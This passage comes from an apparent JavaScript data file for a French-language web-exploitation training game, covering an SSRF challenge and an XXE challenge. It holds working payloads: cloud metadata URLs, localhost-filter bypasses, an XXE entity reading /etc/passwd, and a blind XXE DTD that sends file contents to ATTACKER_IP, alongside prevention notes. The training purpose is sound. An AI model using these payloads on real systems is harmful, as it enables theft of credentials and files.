http://169.254.169.254/computeMetadata/v1/instance/service-accounts/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
  (avec header: Metadata: true)

## Bypass de filtres localhost
http://[::1]/                   # IPv6 loopback
http://0.0.0.0/                 # Wildcard
http://0177.0.0.01/             # Octal
http://2130706433/              # Décimal
http://127.1/                   # Notation courte
http://localtest.me/            # DNS → 127.0.0.1
`,
      'ssrf_explanation.txt': `# SSRF — Server-Side Request Forgery

## Schéma de l'attaque
  Attaquant → [param url=] → Serveur vulnérable → Service interne
                                                  ↑ normalement inaccessible

## Code vulnérable (Python Flask)
@app.route('/fetch')
def fetch():
    url = request.args.get('url')      # entrée non filtrée
    response = requests.get(url)       # le serveur fait la requête
    return response.text               # retourne le contenu

## Impact selon les services internes exposés
- Admin panel sans auth (suppose accès interne seulement)
- AWS/GCP metadata → credentials → compromission du compte cloud
- Redis SSRF → écriture arbitraire via Gopher protocol
- Elasticsearch → exfiltration des données
- Docker API → création de container root → escape

## Protocoles exploitables en SSRF
- http:// / https://              (classique)
- file:///etc/passwd              (si autorisé)
- dict://localhost:11211/stat     (Memcached)
- gopher://localhost:6379/_SET... (Redis via Gopher — avancé)

## Prévention
- Liste blanche des domaines/IPs autorisés
- Résolution DNS avant validation (attention aux rebind attacks)
- Bloquer les RFC 1918 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Bloquer 169.254.169.254 explicitement
- Pas de retour du corps de réponse au client (SSRF aveugle seulement)
`
    },
    validation: [
      { type: 'command', value: 'curl', description: 'Déclencher une SSRF vers un service interne' }
    ],
    story: "🕳️ L'application propose de prévisualiser des URLs. Le serveur tourne sur une instance EC2 AWS. Une requête vers `169.254.169.254` depuis le serveur pourrait exposer des credentials IAM avec des droits sur l'ensemble du compte Amazon."
  },
  {
    id: 120,
    title: "XXE — XML External Entity",
    difficulty: 'advanced',
    category: "Web Exploitation",
    objective: "Exploiter les entités XML externes pour lire des fichiers",
    description: "XXE (XML External Entity) exploite le parseur XML du serveur pour définir des **entités externes** pointant vers des ressources locales ou distantes. La DTD (Document Type Definition) permet de déclarer `<!ENTITY xxe SYSTEM 'file:///etc/passwd'>` : quand le parseur résout l'entité `&xxe;`, il lit le fichier et l'insère dans la réponse. Le **blind XXE** n'a pas de retour direct : on exfiltre via une requête DNS/HTTP vers un serveur externe. Le **XXE-to-SSRF** utilise `SYSTEM 'http://169.254.169.254/'` pour accéder aux endpoints internes via le parseur XML.",
    commands: ['curl'],
    hints: [
      "`curl -X POST 'http://target.local/api/parse' -H 'Content-Type: application/xml' -d @xxe_payload.xml` — envoie le payload XXE depuis le fichier fourni ; si `/etc/passwd` apparaît dans la réponse, c'est exploitable.",
      "Pour un blind XXE : modifie le payload pour pointer vers ton serveur (`SYSTEM 'http://TON_IP/detect'`) puis écoute avec `nc -lvnp 80` — si tu reçois une connexion, le parseur résout les entités externes.",
      "XXE via SYSTEM 'php://filter/...' ou 'file:///etc/shadow' — essaie différentes ressources ; si le fichier contient des caractères spéciaux XML (< > &), utilise un wrapper base64 : `php://filter/convert.base64-encode/resource=/etc/passwd`."
    ],
    fileSystem: {
      'xxe_payload.xml': `<?xml version="1.0" encoding="UTF-8"?>

<!--
  XXE Payload — Lecture de fichier local
  Usage : curl -X POST http://target.local/api/parse \
               -H 'Content-Type: application/xml' \
               -d @xxe_payload.xml
-->

<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

<!-- =====================================================
  Autres payloads utiles :
  ===================================================== -->

<!-- Lire /etc/hosts -->
<!--
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root><data>&xxe;</data></root>
-->

<!-- XXE-to-SSRF vers metadata AWS -->
<!--
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>
-->

<!-- Blind XXE (out-of-band) vers serveur attaquant -->
<!--
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP/evil.dtd">
  %remote;
]>
<root><data>&exfil;</data></root>
-->

<!-- evil.dtd hébergé sur l'attaquant :
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP/?data=%file;'>">
%wrap;
-->
`,
      'xxe_explanation.txt': `# XXE — XML External Entity Injection

## Comment fonctionne XML
XML supporte les "entités" : des raccourcis textuels.
Entité interne :   <!ENTITY name "valeur"> → &name; remplacé par "valeur"
Entité externe :   <!ENTITY name SYSTEM "URI"> → le parseur CHARGE l'URI

## Exploitation basique
Le parseur lit file:///etc/passwd et l'insère dans la réponse :

  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <foo>&xxe;</foo>

  Réponse serveur : root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...

## Applications typiquement vulnérables
- API REST qui accepte XML (souvent changeable via Content-Type)
- Traitement de fichiers docx/xlsx/svg (ce sont des ZIP contenant du XML)
- SOAP Web Services (XML natif)
- Parseurs XML dans des convertisseurs PDF, rapports, etc.

## Blind XXE (pas de retour dans la réponse)
Technique out-of-band :
  1. L'attaquant héberge un evil.dtd sur son serveur
  2. Le payload XXE inclut ce DTD externe
  3. Le DTD définit une entité qui exfiltre le fichier cible
     via une requête HTTP vers l'attaquant

## Protocoles supportés (selon le parseur)
file:///              → lecture de fichiers locaux
http:// / https://    → SSRF
php://filter/...      → wrappers PHP (lecture source encodée)
expect://id           → RCE si le module expect est activé (rare)

## Prévention
- Désactiver les entités externes dans le parseur :
  Java   : factory.setFeature("http://xml.org/sax/features/external-general-entities", false)
  PHP    : libxml_disable_entity_loader(true)
  Python : etree.XMLParser(resolve_entities=False)
- Valider et filtrer l'input XML
- Utiliser JSON à la place de XML quand possible
`
    },
    validation: [
      { type: 'command', value: 'curl', description: 'Envoyer un payload XXE avec curl -d @xxe_payload.xml' }
    ],
    story: "📄 L'API de traitement de factures accepte du XML. Une entité externe bien placée dans la DTD pourrait lire les fichiers système du serveur — ou pivoter vers les services internes via SSRF."
  },
];
